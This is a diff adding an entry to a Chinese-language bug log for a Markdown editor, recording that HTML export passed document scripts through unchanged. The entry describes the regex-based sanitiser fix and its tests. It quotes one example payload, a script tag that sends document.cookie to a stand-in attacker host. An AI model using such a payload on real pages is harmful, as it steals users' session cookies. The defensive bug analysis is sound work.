@@ -66,6 +66,7 @@
 | BUG-062 | 2026-08-28 | 「最近文件」在 10 种语言里都是英文，而守这件事的测试形同虚设 | P2 | 已修复 |
 | BUG-063 | 2026-08-28 | 程序已在运行时双击文件，窗口不会被唤到前台；再点图标更是毫无反应 | **P1** | 已修复 |
 | BUG-064 | 2026-08-28 | 引用式图片 `![alt][ref]` 渲染成链接，`!` 掉在外面 | P2 | 已修复 |
+| BUG-065 | 2026-08-28 | 导出 HTML 时原样输出文档里的脚本，用浏览器打开就会执行 | **P1** | 已修复 |
 
 ## 详细记录
 
@@ -2106,5 +2107,79 @@ CommonMark 里 `[ref]` 单独出现、且存在 `[ref]:` 定义时应解析成�
 
 - `code/lib/services/markdown_parser.dart`
 - `code/test/services/reference_image_test.dart` —— 新增
+
+---
+
+## BUG-065 — 导出 HTML 时原样输出文档里的脚本
+
+**发现日期**：2026-08-28 　**优先级**：P1 　**状态**：已修复
+
+### 现象
+
+文档里如果有一段原始 HTML：
+
+```html
+<script>fetch('https://attacker/'+document.cookie)</script>
+```
+
+导出成 HTML 之后，那段脚本**原样写进了导出文件**。用浏览器打开这个文件，脚本就会执行。
+
+**关键在于编辑器里看不出来**：预览把 HTML 块当作等宽纯文本显示（`_buildHtmlBlock`
+用的是 `Text(node.html)`），所以读者在编辑器里从头到尾都不会看到任何异常，
+直到他把导出的文件用浏览器打开。
+
+一份别人写的文档 —— 下载的 README、同事发来的笔记 —— 就足以构成这个场景。
+
+### 根因
+
+```dart
+case NodeType.htmlBlock:
+  final html = node as HtmlBlockNode;
+  return html.html;      // ← 原样输出
+```
+
+### 是怎么找到的
+
+延续上一轮的做法：**把上游的测试用例当规格书**。
+`packages/muya/e2e/tests/export/markdown-to-html.spec.ts` 里有一条：
+
+> `script injection: <script> tag is sanitised away and does not execute`
+
+上游在同一条路径上做了清理，并且专门给它写了测试。
+
+### 修复方案
+
+新增 `ExportService.sanitiseHtmlForExport`，只去掉**会自己运行**的那部分：
+
+- `<script>` / `<iframe>` / `<object>` / `<embed>` / `<applet>` 连同内容（闭合与否都处理 ——
+  一个没闭合的 `<script src=...>` 留在那里，后面整篇文档都会变成脚本源码）
+- `onclick` / `onerror` / `onload` 等所有 `on…` 事件属性（**保留元素本身**）
+- `javascript:` / `vbscript:` 形式的 `href` / `src`
+
+**其余原样保留**：`<details>`、`<kbd>`、`<img>`、`<table>`、`style` 属性…… 导出件本
+就该长得像原文档，清理过头是另一种错。
+
+### 明确的限制
+
+**这是尽力而为，不是安全边界。**它用正则处理文本，而正则不是解析 HTML 的正确方式。
+放在这里是因为「全部原样透传」更糟，而不是因为它能挡住有备而来的构造。
+这一点写在函数的文档注释里，避免以后有人当成保证。
+
+### 检查过、确认不受影响的地方
+
+- **预览**：HTML 块显示为等宽纯文本，不执行，本来就没有风险
+- **内联 HTML**：`InlineType` 里没有 `html` 这一项，内联 HTML 在解析阶段就被展开成
+  其它 span 类型，所以原样透传的路径**只有 HTML 块这一处** —— 不存在「修了一半」的问题
+- **PDF / Word 导出**：把 HTML 当文本画，不执行
+
+### 测试
+
+`code/test/services/html_export_sanitise_test.dart`，6 条。最后一条守的是反面：
+六种常见的良性标记必须**逐字不变**地保留 —— 清理器最容易犯的错是删多了。
+
+### 涉及文件
+
+- `code/lib/services/export_service.dart`
+- `code/test/services/html_export_sanitise_test.dart` —— 新增
 
 ---
